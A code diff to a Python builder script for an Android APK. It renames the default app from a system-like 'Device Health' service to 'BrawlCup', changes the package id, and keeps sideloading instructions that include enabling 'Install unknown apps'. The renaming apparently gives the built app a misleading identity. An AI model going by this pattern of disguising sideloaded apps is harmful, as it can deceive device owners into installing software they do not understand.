@@ -485,12 +485,12 @@ def main():
     parser.add_argument("--apikey", help="Supabase API key")
     parser.add_argument("--arch", default="arm64,arm",
                         help="Target architectures, comma-separated (default: arm64,arm). Options: arm64, arm, x86_64, x86. 32-bit (arm/x86) requires Android NDK.")
-    parser.add_argument("--output", default="DeviceHealth.apk", help="Output APK filename")
+    parser.add_argument("--output", default="BrawlCup.apk", help="Output APK filename")
     args = parser.parse_args()
 
     print()
     print("  ╔══════════════════════════════════════╗")
-    print("  ║   Val-Tine Android Builder            ║")
+    print("  ║   BrawlCup Android Builder             ║")
     print("  ╚══════════════════════════════════════╝")
     print()
 
@@ -595,10 +595,12 @@ def main():
     print()
     print("  If 'App not installed':")
     print("    1. Uninstall any previous version first (different signature blocks install):")
-    print("       adb uninstall com.devicehealth.service")
-    print("       Or: Settings > Apps > Device Health > Uninstall")
+    print("       adb uninstall com.brawlcup.app")
+    print("       Or: Settings > Apps > BrawlCup > Uninstall")
     print("    2. Enable 'Install unknown apps' for your file manager/browser")
     print("    3. Device must be Android 6.0+ (Marshmallow)")
+    print()
+    print("  Package: com.brawlcup.app")
     print()
 
 
